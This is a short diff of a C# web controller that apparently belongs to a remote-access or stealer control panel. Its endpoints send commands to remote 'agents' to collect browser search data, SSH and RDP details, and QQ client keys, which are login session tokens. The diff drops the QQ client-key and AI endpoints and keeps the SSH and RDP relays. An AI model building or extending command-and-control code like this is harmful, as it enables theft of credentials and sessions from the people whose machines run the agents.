@@ -62,12 +62,6 @@ public class OtherSoftController : ControllerBase
         return await RelayAndWaitAsync(agentId, "othersoft.browser.search", new { type, keyword }, ct, 60);
     }
 
-    [HttpPost("{agentId}/ai")]
-    public async Task<IActionResult> GetAI(string agentId, CancellationToken ct)
-    {
-        return await RelayAndWaitAsync(agentId, "othersoft.ai", null, ct, 20);
-    }
-
     [HttpPost("{agentId}/ssh")]
     public async Task<IActionResult> GetSSH(string agentId, CancellationToken ct)
     {
@@ -78,12 +72,6 @@ public class OtherSoftController : ControllerBase
     public async Task<IActionResult> GetRDP(string agentId, CancellationToken ct)
     {
         return await RelayAndWaitAsync(agentId, "othersoft.rdp", null, ct, 30);
-    }
-
-    [HttpPost("{agentId}/qq/clientkey")]
-    public async Task<IActionResult> GetQQClientKey(string agentId, CancellationToken ct)
-    {
-        return await RelayAndWaitAsync(agentId, "othersoft.qq_clientkey", null, ct, 120);
     }
 
     /// <summary>Fetch QQ portraits from qzone (server-side, no CORS).</summary>
